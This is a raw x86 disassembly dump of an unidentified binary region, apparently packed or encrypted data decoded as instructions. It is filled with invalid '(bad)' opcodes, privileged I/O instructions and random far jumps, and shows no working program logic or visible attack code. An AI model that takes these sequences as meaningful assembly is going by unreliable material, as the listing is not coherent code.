  41cfd3:	jo     0x41d02f
  41cfd5:	mov    al,0x47
  41cfd7:	sbb    dl,BYTE PTR [edi]
  41cfd9:	js     0x41cfd3
  41cfdb:	sub    eax,0xaf068442
  41cfe0:	and    DWORD PTR [ebx],ebx
  41cfe2:	scas   eax,DWORD PTR es:[edi]
  41cfe3:	push   0xffffffda
  41cfe5:	pop    edx
  41cfe6:	mov    ebp,0x73e7e970
  41cfeb:	cmp    eax,0xa1a45c1b
  41cff0:	das    
  41cff1:	fdiv   st,st(6)
  41cff3:	shl    edx,1
  41cff5:	shl    BYTE PTR [eax+0x78],1
  41cff8:	les    eax,FWORD PTR [eax-0x14]
  41cffb:	adc    ah,BYTE PTR [ebx+0x3508eda5]
  41d001:	push   ecx
  41d002:	xchg   esp,eax
  41d003:	mov    edx,0x7b2b69ae
  41d008:	sub    al,0x91
  41d00a:	mov    ebp,ebp
  41d00c:	jns    0x41d054
  41d00e:	popf   
  41d00f:	mov    bl,0x3c
  41d011:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d012:	mov    ecx,0x7824355
  41d017:	mov    al,ds:0x235367cb
  41d01c:	mov    dl,al
  41d01e:	les    eax,FWORD PTR [edi]
  41d020:	adc    bh,BYTE PTR [edx+0x37969c17]
  41d026:	jb     0x41d063
  41d028:	sub    DWORD PTR [ecx+edi*8-0x5bb41b8f],ebp
  41d02f:	jnp    0x41d069
  41d031:	mov    eax,DWORD PTR [ebx]
  41d033:	mov    eax,ds:0x34878ed
  41d038:	pop    ds
  41d039:	mov    ecx,0xb3c7a676
  41d03e:	cmp    bl,bh
  41d040:	and    al,BYTE PTR [eax]
	...
  41d0b2:	add    BYTE PTR [eax],al
  41d0b4:	(bad)  [edx-0x5f]
  41d0b7:	clc    
  41d0b8:	mov    bl,0xfb
  41d0ba:	fldcw  WORD PTR [ebx-0x56]
  41d0bd:	cwde   
  41d0be:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d0bf:	adc    BYTE PTR ds:0xcf910d04,0x38
  41d0c6:	add    DWORD PTR [eax],eax
  41d0c8:	cmc    
  41d0c9:	add    BYTE PTR [eax],al
  41d0cb:	add    BYTE PTR [ebp-0x64],ah
  41d0ce:	mov    al,0x2f
  41d0d0:	(bad)
  41d0d4:	test   al,0x23
  41d0d6:	dec    esi
  41d0d7:	and    DWORD PTR [esi+ecx*4],ecx
  41d0da:	fisubr DWORD PTR [eax+edi*1]
  41d0dd:	lahf   
  41d0de:	call   0x4f53:0x49440c7c
  41d0e5:	mov    eax,0x39c69528
  41d0ea:	lods   al,BYTE PTR ds:[esi]
  41d0eb:	push   edi
  41d0ec:	fistp  DWORD PTR [edi-0x38300749]
  41d0f2:	sbb    bl,cl
  41d0f4:	jecxz  0x41d16d
  41d0f6:	dec    edi
  41d0f7:	mov    esi,0xece697fa
  41d0fc:	rol    BYTE PTR [edi-0xd],0xa6
  41d100:	test   al,0x5f
  41d102:	cmp    al,0xfc
  41d104:	and    dl,BYTE PTR [ebx+0x32]
  41d107:	sti    
  41d108:	and    eax,0xf6f9ab89
  41d10d:	sbb    al,BYTE PTR [eax]
  41d10f:	lods   eax,DWORD PTR ds:[esi]
  41d110:	repnz xor BYTE PTR [eax+0xed03df4],0x57
  41d118:	call   0xc040:0x6dec6196
  41d11f:	cmp    DWORD PTR [ecx],0x46
  41d122:	xchg   esp,eax
  41d123:	jns    0x41d186
  41d125:	pop    eax
  41d126:	out    0x78,eax
  41d128:	pop    es
  41d129:	js     0x41d13a
  41d12b:	mov    edi,0xaf6dadb6
  41d130:	pop    esi
  41d131:	mov    ebx,0x7746cd31
  41d136:	mov    eax,0xed60234f
  41d13b:	ret    0x9eed
  41d13e:	test   eax,0x30459a59
  41d143:	jge    0x41d0d3
  41d145:	sbb    DWORD PTR [ebx-0x3f1b43b],ebx
  41d14b:	aaa    
  41d14c:	cli    
  41d14d:	and    dh,BYTE PTR [esi-0x70cbee0f]
  41d153:	mov    eax,0x394f0a47
  41d158:	sar    edx,cl
  41d15a:	je     0x41d127
  41d15c:	stos   BYTE PTR es:[edi],al
  41d15d:	(bad)  
  41d15e:	adc    bh,BYTE PTR [edi-0x25]
  41d161:	add    BYTE PTR [ebp+0xc36c6cb],ch
  41d167:	dec    ecx
  41d168:	and    BYTE PTR [eax+0x22],al
  41d16b:	stos   DWORD PTR es:[edi],eax
  41d16c:	sahf   
  41d16d:	mov    cl,0x8f
  41d16f:	call   FWORD PTR [esi-0x2be5c533]
  41d175:	fbld   TBYTE PTR [ebx+0x4f]
  41d178:	xchg   ecx,eax
  41d179:	lahf   
  41d17a:	and    al,dh
  41d17c:	jne    0x41d18c
  41d17e:	push   0x45a11bcb
  41d183:	sbb    bl,BYTE PTR [ebx]
  41d185:	test   DWORD PTR [edx-0xe5693a1],edi
  41d18b:	add    eax,0x6800cd91
  41d190:	xlat   BYTE PTR ds:[ebx]
  41d191:	xor    eax,0x41fb2056
  41d196:	push   cs
  41d197:	inc    ecx
  41d198:	jns    0x41d1de
  41d19a:	cmp    edx,0xffffff9c
  41d19d:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d19e:	std    
  41d19f:	inc    ebp
  41d1a0:	push   ebx
  41d1a1:	stc    
  41d1a2:	mov    WORD PTR [edi+0x23],?
  41d1a5:	call   0x26d2:0x15555c5b
  41d1ac:	ins    BYTE PTR es:[edi],dx
  41d1ad:	cli    
  41d1ae:	pop    ds
  41d1af:	jno    0x41d1dc
  41d1b1:	inc    edx
  41d1b2:	aas    
  41d1b3:	out    dx,eax
  41d1b4:	shr    BYTE PTR [ecx],1
  41d1b6:	lock sub eax,0xc038c45d
  41d1bc:	dec    eax
  41d1bd:	xchg   esp,eax
  41d1be:	add    DWORD PTR [esi],esp
  41d1c0:	xor    eax,DWORD PTR [eax]
	...
  41d232:	add    BYTE PTR [eax],al
  41d234:	repz and ebp,ecx
  41d237:	push   ebp
  41d238:	(bad)  
  41d23a:	sti    
  41d23b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d23c:	pop    edi
  41d23d:	push   edx
  41d23e:	jo     0x41d1ff
  41d240:	push   ebx
  41d241:	cmp    BYTE PTR [ebx-0x4b],bh
  41d244:	les    edi,FWORD PTR [ecx]
  41d246:	add    DWORD PTR [eax],eax
  41d248:	cmc    
  41d249:	add    BYTE PTR [eax],al
  41d24b:	add    BYTE PTR [ebx-0x9],cl
  41d24e:	cwde   
  41d24f:	sub    eax,0x7dc4c330
  41d254:	test   al,0x7b
  41d256:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d257:	daa    
  41d258:	not    DWORD PTR [edx]
  41d25a:	and    bh,dh
  41d25c:	and    ch,BYTE PTR [ecx-0x39]
  41d25f:	or     ebx,DWORD PTR [ebp+0x4b]
  41d262:	push   cs
  41d263:	mov    ch,0x4f
  41d265:	or     al,0x3f
  41d267:	or     al,0x72
  41d269:	imul   ebp
  41d26b:	jmp    0x41d2dd
  41d26d:	xor    eax,0xc50fc1a8
  41d272:	data16 cmps BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d274:	ds call 0x169b:0x763fd061
  41d27c:	jmp    0x1cdd:0x1408fa61
  41d283:	add    eax,0x649ef94d
  41d288:	push   es
  41d289:	inc    ebp
  41d28a:	jl     0x41d2e9
  41d28c:	mov    ebx,edi
  41d28e:	(bad)  
  41d290:	pop    ebp
  41d291:	mov    eax,0xd7785c4
  41d296:	pop    esp
  41d297:	jg     0x41d2ab
  41d299:	xchg   esp,eax
  41d29a:	and    eax,0x18efc8b6
  41d29f:	cmp    eax,0xc7492b61
  41d2a4:	xchg   ecx,eax
  41d2a5:	xor    ecx,esi
  41d2a7:	hlt    
  41d2a8:	jne    0x41d262
  41d2aa:	ret    0xfb83
  41d2ad:	dec    esi
  41d2ae:	daa    
  41d2af:	stos   BYTE PTR es:[edi],al
  41d2b0:	imul   BYTE PTR [edx]
  41d2b2:	pop    eax
  41d2b3:	adc    BYTE PTR [edx],bl
  41d2b5:	pop    edi
  41d2b6:	lods   al,BYTE PTR ds:[esi]
  41d2b7:	js     0x41d310
  41d2b9:	dec    eax
  41d2ba:	clc    
  41d2bb:	mov    dh,0xd4
  41d2bd:	int    0x86
  41d2bf:	das    
  41d2c0:	and    edi,DWORD PTR [edi]
  41d2c2:	or     bl,dl
  41d2c4:	arpl   WORD PTR [esp+ebx*2],dx
  41d2c7:	add    DWORD PTR [esi+0x69],esi
  41d2ca:	cli    
  41d2cb:	fld    TBYTE PTR [esi]
  41d2cd:	(bad)  
  41d2ce:	retf   
  41d2cf:	int    0x50
  41d2d1:	ins    BYTE PTR es:[edi],dx
  41d2d2:	and    DWORD PTR [edi+0x3f],0xffffffe2
  41d2d6:	sbb    BYTE PTR [edi-0x34],0x27
  41d2da:	xchg   ebx,eax
  41d2db:	(bad)  
  41d2dc:	inc    esp
  41d2dd:	jge    0x41d2dd
  41d2df:	adc    esp,DWORD PTR [edi-0x4523c1df]
  41d2e5:	mov    WORD PTR [edx+esi*4-0x7ec33931],ss
  41d2ec:	fdivr  st,st(6)
  41d2ee:	pop    ebx
  41d2ef:	adc    al,0x67
  41d2f1:	jnp    0x41d370
  41d2f3:	(bad)  
  41d2f4:	ja     0x41d363
  41d2f6:	clc    
  41d2f7:	adc    al,0x1e
  41d2f9:	adc    dh,BYTE PTR [edx]
  41d2fb:	xor    dl,BYTE PTR [ebx-0x166e35d5]
  41d301:	imul   ecx,DWORD PTR [edx-0x29ad798b],0x67a3aab0
  41d30b:	aam    0x37
  41d30d:	retf   0x53b
  41d310:	dec    esi
  41d311:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d312:	jbe    0x41d29f
  41d314:	mov    ebp,0xbd27effa
  41d319:	fs sbb eax,0x620064f3
  41d31f:	ss push ss
  41d321:	fisub  WORD PTR [esi]
  41d323:	inc    ecx
  41d324:	mov    sp,0x5c4a
  41d328:	jmp    0x41d2d6
  41d32a:	popa   
  41d32b:	dec    ebx
  41d32c:	in     al,0xf8
  41d32e:	adc    eax,0x83893cff
  41d333:	(bad)  [edi-0x1f]
  41d336:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d337:	push   edi
  41d338:	sbb    BYTE PTR [esi+0x26],bh
  41d33b:	lods   al,BYTE PTR ds:[esi]
  41d33c:	sbb    ch,BYTE PTR [eax+0xbe082b]
	...
  41d3b2:	add    BYTE PTR [eax],al
  41d3b4:	push   ebx
  41d3b5:	and    BYTE PTR [eax+0x5faef3ae],ah
  41d3bb:	std    
  41d3bc:	cmp    eax,0x4c
  41d3bf:	(bad)  
  41d3c0:	sbb    al,0x7c
  41d3c2:	ficom  WORD PTR [ecx+0x13ab9]
  41d3c8:	cmc    
  41d3c9:	add    BYTE PTR [eax],al
  41d3cb:	add    BYTE PTR [edx+ebp*8],al
  41d3ce:	add    ch,BYTE PTR [edx-0x70]
  41d3d1:	lods   eax,DWORD PTR ds:[esi]
  41d3d2:	arpl   WORD PTR [ebx-0x736250ae],ax
  41d3d8:	lahf   
  41d3d9:	mov    es,WORD PTR [ebp-0x4fba22c7]
  41d3df:	xchg   cl,bh
  41d3e1:	jl     0x41d37b
  41d3e3:	adc    DWORD PTR [ebx-0x45],edx
  41d3e6:	arpl   WORD PTR [edi],bx
  41d3e8:	pop    ss
  41d3e9:	mov    dl,0x96
  41d3eb:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d3ec:	add    DWORD PTR [ebp+0x57],edx
  41d3ef:	clc    
  41d3f0:	daa    
  41d3f1:	jle    0x41d3b0
  41d3f3:	not    BYTE PTR [ebx]
  41d3f5:	in     al,dx
  41d3f6:	xor    eax,0x5feb6e40
  41d3fb:	add    al,0x92
  41d3fd:	jl     0x41d3ef
  41d3ff:	outs   dx,DWORD PTR ds:[esi]
  41d400:	jns    0x41d46c
  41d402:	mov    cl,ah
  41d404:	mov    bl,0xd5
  41d406:	or     al,0x13
  41d408:	push   ss
  41d409:	stos   BYTE PTR es:[edi],al
  41d40a:	add    eax,0x1f05c8d6
  41d40f:	es clc 
  41d411:	cmovns ebx,DWORD PTR [ecx]
  41d414:	and    eax,0xdbf79a27
  41d419:	push   eax
  41d41a:	cmc    
  41d41b:	sti    
  41d41c:	cmp    ah,BYTE PTR [ebp+eiz*8+0x3ff9ae1e]
  41d423:	(bad)  
  41d424:	scas   al,BYTE PTR es:[edi]
  41d425:	dec    ebx
  41d426:	jl     0x41d40c
  41d428:	mov    ds:0x3c424cf3,eax
  41d42d:	rol    dh,1
  41d42f:	psrlq  mm1,QWORD PTR [ebx+0x1057b070]
  41d436:	and    ebp,DWORD PTR [esi+0xebf2f1c]
  41d43c:	dec    ecx
  41d43d:	dec    edx
  41d43e:	ins    BYTE PTR es:[edi],dx
  41d43f:	imul   ebx,ebx,0x80284c54
  41d445:	(bad)  
  41d446:	sub    BYTE PTR [ebp+0x510a2e1d],dh
  41d44c:	mov    WORD PTR [ecx+0x69c874a],fs
  41d452:	jge    0x41d4aa
  41d454:	bound  esp,QWORD PTR [edi-0x207a1b93]
  41d45a:	scas   eax,DWORD PTR es:[edi]
  41d45b:	jmp    0x66ab00b9
  41d460:	ret    
  41d461:	mov    bh,0x43
  41d463:	fcom   DWORD PTR [edx-0x1dd03f62]
  41d469:	sti    
  41d46a:	jmp    0x9d8b:0xa7a2d041
  41d471:	push   esp
  41d472:	ss xchg ebp,eax
  41d474:	aam    0xa5
  41d476:	gs dec eax
  41d478:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d479:	es mov bl,bl
  41d47c:	cwde   
  41d47d:	cmp    ch,BYTE PTR [edx-0x57]
  41d480:	add    al,0x12
  41d482:	ja     0x41d410
  41d484:	adc    edi,DWORD PTR [edx+ebx*4]
  41d487:	lahf   
  41d488:	into   
  41d489:	mov    DWORD PTR [edi+0x3a],ebx
  41d48c:	and    DWORD PTR [ebx],edx
  41d48e:	mov    esp,0x34714bc6
  41d493:	or     DWORD PTR [ecx+edi*2-0x3],ecx
  41d497:	iret   
  41d498:	jbe    0x41d4ab
  41d49a:	jl     0x41d4ac
  41d49c:	mov    bl,0x3a
  41d49e:	(bad)
  41d4a1:	xchg   esp,eax
  41d4a2:	je     0x41d4dd
  41d4a4:	pop    edx
  41d4a5:	jne    0x41d45f
  41d4a7:	pushf  
  41d4a8:	stos   DWORD PTR es:[edi],eax
  41d4a9:	nop
  41d4aa:	fnstcw WORD PTR [ebx]
  41d4ac:	not    DWORD PTR [ebx+0x7b]
  41d4af:	leave  
  41d4b0:	jmp    0x41d4ce
  41d4b2:	cmp    BYTE PTR [ecx+0x66],ch
  41d4b5:	push   ss
  41d4b6:	sti    
  41d4b7:	repnz mov ah,BYTE PTR [edx+eiz*1+0x76a6b63b]
  41d4bf:	call   0x41d567
	...
  41d534:	lds    esp,FWORD PTR [ebx]
  41d536:	xchg   ecx,eax
  41d537:	and    eax,0xe3f5b7f7
  41d53c:	push   ecx
  41d53d:	or     edi,DWORD PTR [edx+ecx*8+0x39aec65f]
  41d544:	scas   al,BYTE PTR es:[edi]
  41d545:	cmp    eax,DWORD PTR [ecx]
  41d547:	add    ch,dh
  41d549:	add    BYTE PTR [eax],al
  41d54b:	add    BYTE PTR [ebx-0x58ad65d7],dh
  41d551:	pop    ecx
  41d552:	dec    ecx
  41d553:	sub    eax,0x92eec929
  41d558:	bound  ecx,QWORD PTR [edx+0x5fa123cf]
  41d55e:	and    al,0x8c
  41d560:	call   0x6293:0xf9f5ee7c
  41d567:	dec    esp
  41d568:	dec    ebp
  41d569:	pop    edi
  41d56a:	dec    ebx
  41d56b:	sbb    ebp,edx
  41d56d:	mov    dh,0x3b
  41d56f:	pop    ecx
  41d570:	ja     0x41d517
  41d572:	and    DWORD PTR [edx+eiz*8-0x334411e8],ebx
  41d579:	in     eax,dx
  41d57a:	icebp  
  41d57b:	push   ds
  41d57c:	jae    0x41d5c5
  41d57e:	pop    edx
  41d57f:	mov    ch,0x39
  41d581:	xchg   esi,eax
  41d582:	pop    es
  41d583:	stos   DWORD PTR es:[edi],eax
  41d584:	jae    0x41d545
  41d586:	mov    eax,ds:0x845823e7
  41d58b:	sub    ch,dl
  41d58d:	inc    ecx
  41d58e:	sub    BYTE PTR [ebp+0x3d4f2e4d],dl
  41d594:	dec    eax
  41d595:	and    edx,DWORD PTR [ebp-0x46]
  41d598:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  41d599:	push   es
  41d59a:	adc    BYTE PTR [ecx+edi*2+0x645d4c61],dl
  41d5a1:	test   BYTE PTR [ebx+0x3c],ch
  41d5a4:	ja     0x41d554
  41d5a6:	xor    eax,0xf23238dc
  41d5ab:	hlt    
  41d5ac:	stos   DWORD PTR es:[edi],eax
  41d5ad:	sbb    al,BYTE PTR [esi+0x720e2027]
  41d5b3:	or     eax,0x768732ee
  41d5b8:	jno    0x41d58e
  41d5ba:	mov    bl,0x16
  41d5bc:	xchg   esi,eax
  41d5bd:	adc    al,0x14
  41d5bf:	mov    ebp,0x7e1e2aa9
  41d5c4:	sub    al,BYTE PTR [ebp-0x77]
  41d5c7:	jb     0x41d5eb
  41d5c9:	in     eax,dx
  41d5ca:	nop
  41d5cb:	dec    esp
  41d5cc:	fnstenv ss:[edi]
  41d5cf:	jl     0x41d5a7
  41d5d1:	xor    DWORD PTR [ecx+0x1c],esi
  41d5d4:	xchg   ebx,eax
  41d5d5:	jne    0x41d625
  41d5d7:	push   ebx
  41d5d8:	scas   al,BYTE PTR es:[edi]
  41d5d9:	mov    ?,WORD PTR [eax+0x278cbd4c]
  41d5df:	leave  
  41d5e0:	das    
  41d5e1:	pop    es
  41d5e2:	inc    eax
  41d5e3:	pop    ebp
  41d5e4:	sub    DWORD PTR [esi-0x46],ebx
  41d5e7:	pop    es
  41d5e8:	inc    edi
  41d5e9:	dec    eax
  41d5ea:	inc    esi
  41d5eb:	xchg   ecx,eax
  41d5ec:	popa   
  41d5ed:	pop    ds
  41d5ee:	lock xor eax,0xe6c93567
  41d5f4:	pusha  
  41d5f5:	ss dec edx
  41d5f7:	add    BYTE PTR [ebp+0x716d8e96],ch
  41d5fd:	pop    eax
  41d5fe:	xchg   DWORD PTR [ebp-0x4a],edi
  41d601:	push   ebp
  41d602:	leave  
  41d603:	imul   ecx,DWORD PTR [esi+0x2],0x568df86
  41d60a:	fidivr WORD PTR [edx]
  41d60c:	lods   al,BYTE PTR ds:[esi]
  41d60d:	jmp    0xa33fe0af
  41d612:	sub    dh,BYTE PTR [eiz*4-0x600058ca]
  41d619:	in     al,dx
  41d61a:	mov    dh,0x7
  41d61c:	rcl    ch,0xb8
  41d61f:	xchg   esi,eax
  41d620:	xchg   esp,eax
  41d621:	enter  0x9eda,0xe3
  41d625:	ror    DWORD PTR [ecx-0x2f],cl
  41d628:	pop    edx
  41d629:	(bad)  
  41d62b:	cmp    al,0xe1
  41d62d:	push   0xe6600e5
  41d632:	inc    eax
  41d633:	ret    
  41d634:	cld    
  41d635:	cld    
  41d636:	mov    eax,0xdb6a8f9
  41d63b:	jbe    0x41d5ca
  41d63d:	xor    al,0x7e
  41d63f:	xchg   ebx,eax
  41d640:	pop    es
	...
  41d6b1:	add    BYTE PTR [eax],al
  41d6b3:	add    dl,bl
  41d6b5:	add    edx,eax
  41d6b7:	xchg   bl,bl
  41d6b9:	(bad)  
  41d6ba:	ficomp WORD PTR [ebp+0x8]
  41d6bd:	push   0xbeda0a3b
  41d6c2:	dec    esi
  41d6c3:	dec    esi
  41d6c4:	mov    ds:0xf500013c,eax
  41d6c9:	add    BYTE PTR [eax],al
  41d6cb:	add    BYTE PTR [ebp+0x14a6deb4],ah
  41d6d1:	inc    esi
  41d6d2:	xor    ecx,esi
  41d6d4:	in     eax,0x92
  41d6d6:	and    eax,0x6b0ce522
  41d6db:	inc    ecx
  41d6dc:	mov    esi,0xda4f64e5
  41d6e1:	fs mov edi,0x11043227
  41d6e7:	aad    0xc2
  41d6e9:	out    0xfb,eax
  41d6eb:	popa   
  41d6ec:	jle    0x41d74b
  41d6ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d6ef:	lds    edx,FWORD PTR [esi-0x25e2b5ad]
  41d6f5:	test   eax,0xe02cf588
  41d6fa:	xchg   ebp,eax
  41d6fb:	dec    ebp
  41d6fc:	push   ecx
  41d6fd:	addr16 mov bh,0xc2
  41d700:	mov    eax,0xef899ab4
  41d705:	je     0x41d70c
  41d707:	pop    ds
  41d708:	adc    DWORD PTR [esi],ebp
  41d70a:	xchg   ecx,eax
  41d70b:	(bad)  
  41d70c:	ins    BYTE PTR es:[edi],dx
  41d70d:	xor    eax,0xee1e72a6
  41d712:	jne    0x41d755
  41d714:	fst    DWORD PTR [esi]
  41d716:	sbb    DWORD PTR [ebx+0x6c],edx
  41d719:	dec    ebp
  41d71a:	loop   0x41d6c5
  41d71c:	mov    bh,0x5a
  41d71e:	dec    ecx
  41d71f:	jno    0x41d6f4
  41d721:	cdq    
  41d722:	pushf  
  41d723:	mov    dh,0xf7
  41d725:	arpl   WORD PTR [edi+ebx*1],cx
  41d728:	add    ch,0x13
  41d72b:	inc    ecx
  41d72c:	enter  0xf97a,0x94
  41d730:	jg     0x41d6d9
  41d732:	dec    esi
  41d733:	push   cs
  41d734:	mov    dh,0xca
  41d736:	shr    BYTE PTR [ebp+0x16],cl
  41d739:	and    ebx,ecx
  41d73b:	mov    esi,0x11f71f20
  41d740:	test   al,0x25
  41d742:	mov    WORD PTR [edx],ds
  41d744:	jb     0x41d712
  41d746:	stos   DWORD PTR es:[edi],eax
  41d747:	out    0xc6,al
  41d749:	arpl   WORD PTR [ebx+ebx*8+0x3d],ax
  41d74d:	mov    eax,0x7bf97132
  41d752:	jae    0x41d776
  41d754:	(bad)  
  41d755:	cmp    cl,bl
  41d757:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41d758:	mov    al,ds:0x86789b48
  41d75d:	xor    eax,0x840e3e43
  41d762:	adc    al,0xe8
  41d764:	mov    al,ds:0x1a7a5905
  41d769:	nop
  41d76a:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  41d76b:	pop    edi
  41d76c:	mov    bh,0xa
  41d76e:	loop   0x41d722
  41d770:	popf   
  41d771:	loopne 0x41d70f
  41d773:	sbb    BYTE PTR [ebx+0x73971d26],cl
  41d779:	sub    al,0x76
  41d77b:	mov    ecx,esp
  41d77d:	push   ecx
  41d77e:	not    BYTE PTR [esi-0x71316ce9]
  41d784:	add    esi,ecx
  41d786:	imul   ebp,ebp,0xffffffcc
  41d789:	mov    dl,0x9a
  41d78b:	jmp    0xc074:0x13ca50a4
  41d792:	pop    edi
  41d793:	int    0xa7
  41d795:	sub    eax,DWORD PTR [eax-0x9493b4f]
  41d79b:	mov    esi,0xd97d0dfc
  41d7a0:	(bad)  
  41d7a1:	push   ss
  41d7a2:	jno    0x41d7e1
  41d7a4:	adc    bh,BYTE PTR [esp+ebp*8]
  41d7a7:	xor    al,0xe1
  41d7a9:	clc    
  41d7aa:	adc    eax,0x51dc2217
  41d7af:	sub    ecx,DWORD PTR [edi+0x2d9d85af]
  41d7b5:	pop    ecx
  41d7b6:	push   esp
  41d7b7:	push   ds
  41d7b8:	xchg   BYTE PTR [esp-0x78],bl
  41d7bc:	stc    
  41d7bd:	mov    ds:0x8bd141,eax
	...
  41d832:	add    BYTE PTR [eax],al
  41d834:	arpl   WORD PTR [ebp*4-0x44200cc],si
  41d83b:	ja     0x41d7c4
  41d83d:	repnz pop es
  41d83f:	add    ebx,DWORD PTR [ecx-0x674ed4dd]
  41d845:	cmp    eax,0xf50001
  41d84a:	add    BYTE PTR [eax],al
  41d84c:	icebp  
  41d84d:	sub    dh,dl
  41d84f:	dec    eax
  41d850:	and    DWORD PTR [eax],esp
  41d852:	mov    dl,0x9a
  41d854:	aam    0x84
  41d856:	call   0xb1d3:0x80c52589
  41d85d:	or     eax,DWORD PTR [eax-0x4b1fb0da]
  41d863:	add    al,0x36
  41d865:	arpl   si,ax
  41d867:	jbe    0x41d807
  41d869:	xchg   BYTE PTR [esi+edx*2+0x45],dh
  41d86d:	shl    BYTE PTR [edx],cl
  41d86f:	mov    edx,0xb3dad045
  41d874:	jg     0x41d7f6
  41d876:	add    DWORD PTR [ebx-0x60cf0262],esp
  41d87c:	dec    edi
  41d87d:	add    BYTE PTR [edx+ebp*4+0xb],al
  41d881:	fisttp WORD PTR [edi-0x27]
  41d884:	mov    dl,0xb5
  41d886:	data16 adc ch,BYTE PTR [ecx]
  41d889:	jno    0x41d8d7
  41d88b:	and    eax,0x1d5e799c
  41d890:	pusha  
  41d891:	jb     0x41d850
  41d893:	mov    ds,WORD PTR [edx+0x491b12e9]
  41d899:	test   ebp,esp
  41d89b:	jmp    0xf3f5:0x72fa24ca
  41d8a2:	dec    ebp
  41d8a3:	ins    DWORD PTR es:[edi],dx
  41d8a4:	cld    
  41d8a5:	daa    
  41d8a6:	shl    BYTE PTR [ebp-0x10],1
  41d8a9:	fsub   DWORD PTR [edi-0x48]
  41d8ac:	je     0x41d8fc
  41d8ae:	jae    0x41d87d
  41d8b0:	dec    eax
  41d8b1:	jb     0x41d871
  41d8b3:	das    
  41d8b4:	(bad)  
  41d8b5:	jnp    0x41d91f
  41d8b7:	sti    
  41d8b8:	sbb    ebp,DWORD PTR [ebp-0x5b459925]
  41d8be:	lds    edx,FWORD PTR [ebp+0x14]
  41d8c1:	fwait
  41d8c2:	xchg   ebp,eax
  41d8c3:	(bad)  [edi]
  41d8c5:	mov    eax,ds:0xd1aa1b2
  41d8ca:	xor    ah,BYTE PTR [edi+0x4e]
  41d8cd:	dec    ebp
  41d8ce:	js     0x41d88d
  41d8d0:	or     ebx,esi
  41d8d2:	inc    edi
  41d8d3:	pop    ebx
  41d8d4:	ins    BYTE PTR es:[edi],dx
  41d8d5:	enter  0x83c1,0x47
  41d8d9:	push   ebp
  41d8da:	adc    BYTE PTR [edx],dh
  41d8dc:	mov    BYTE PTR [ecx-0x339f111f],cl
  41d8e2:	push   ebp
  41d8e3:	aaa    
  41d8e4:	ds or  eax,0xe2fa02fa
  41d8ea:	adc    eax,0x81e54798
  41d8ef:	popa   
  41d8f0:	jno    0x41d92d
  41d8f2:	sbb    bl,BYTE PTR [ecx+0x45]
  41d8f5:	pop    esp
  41d8f6:	jl     0x41d938
  41d8f8:	cli    
  41d8f9:	pusha  
  41d8fa:	jle    0x41d8a7
  41d8fc:	fiadd  DWORD PTR [ebx-0x12a0733]
  41d902:	inc    eax
  41d903:	aaa    
  41d904:	loopne 0x41d960
  41d906:	jecxz  0x41d950
  41d908:	mov    ebx,0x96026ac4
  41d90d:	lods   eax,DWORD PTR ds:[esi]
  41d90e:	rcr    ecx,0xe4
  41d911:	push   edi
  41d912:	or     BYTE PTR [ecx],al
  41d914:	xchg   BYTE PTR [edx+0x33c06292],bl
  41d91a:	outs   dx,DWORD PTR ds:[esi]
  41d91b:	pushf  
  41d91c:	pop    ebx
  41d91d:	and    DWORD PTR [eax+0x725cfb06],ecx
  41d923:	stos   DWORD PTR es:[edi],eax
  41d924:	or     dl,dl
  41d926:	add    DWORD PTR [ecx],ebx
  41d928:	sbb    BYTE PTR [edx-0x45],0x87
  41d92c:	and    edi,DWORD PTR [ebp+0x55]
  41d92f:	mov    WORD PTR [ebx+0x18],es
  41d932:	retf   
  41d933:	adc    ebp,0xffffff95
  41d936:	jno    0x41d993
  41d938:	mov    ebp,0xdfd53812
  41d93d:	push   cs
  41d93e:	adc    al,0xc7
  41d940:	mov    al,ds:0x0
	...
  41d9b1:	add    BYTE PTR [eax],al
  41d9b3:	add    al,dh
  41d9b5:	retf   0xfc94
  41d9b8:	mov    esi,0xfdcef8fe
  41d9bd:	cwde   
  41d9be:	sbb    eax,0x3e34691c
  41d9c3:	jae    0x41d952
  41d9c5:	add    DWORD PTR ds:[eax],eax
  41d9c8:	cmc    
  41d9c9:	add    BYTE PTR [eax],al
  41d9cb:	add    al,cl
  41d9cd:	inc    edx
  41d9ce:	pop    ecx
  41d9cf:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  41d9d0:	lock or ecx,DWORD PTR [ebx-0x2c]
  41d9d4:	scas   al,BYTE PTR es:[edi]
  41d9d5:	dec    BYTE PTR [ecx-0x57]
  41d9d8:	xor    eax,0x28aa5b35
  41d9dd:	mov    al,ds:0xc48f4dc3
  41d9e2:	push   0xf18ed0cb
  41d9e7:	mov    ebx,0xd812795d
  41d9ec:	push   ss
  41d9ed:	sub    eax,0x36a7fd2d
  41d9f2:	sbb    esi,DWORD PTR [ebx-0x68]
  41d9f5:	xor    eax,0x9d55c631
  41d9fa:	ins    BYTE PTR es:[edi],dx
  41d9fb:	xor    ebx,0x74
  41d9fe:	inc    ebx
  41d9ff:	adc    eax,0x6f5a6843
  41da04:	aam    0x7d
  41da06:	shr    BYTE PTR [edi-0x791db076],cl
  41da0c:	sti    
  41da0d:	ss (bad) 
  41da0f:	and    dl,dl
  41da11:	cs pushf 
  41da13:	retf   
  41da14:	mov    esp,0xa7437c52
  41da19:	mov    edx,0xa926ad0a
  41da1e:	xchg   ebx,eax
  41da1f:	popa   
  41da20:	ror    DWORD PTR [edx-0x18],0xb9
  41da24:	test   DWORD PTR [edi-0x76],esi
  41da27:	mov    ds:0x317ce45e,al
  41da2c:	pushf  
  41da2d:	ds sub eax,0x85d441e4
  41da33:	or     al,0xbd
  41da35:	xlat   BYTE PTR ds:[ebx]
  41da36:	push   ebx
  41da37:	adc    al,0xe2
  41da39:	test   al,0x72
  41da3b:	fwait
  41da3c:	pop    es
  41da3d:	sub    bh,BYTE PTR [eax-0x7a]
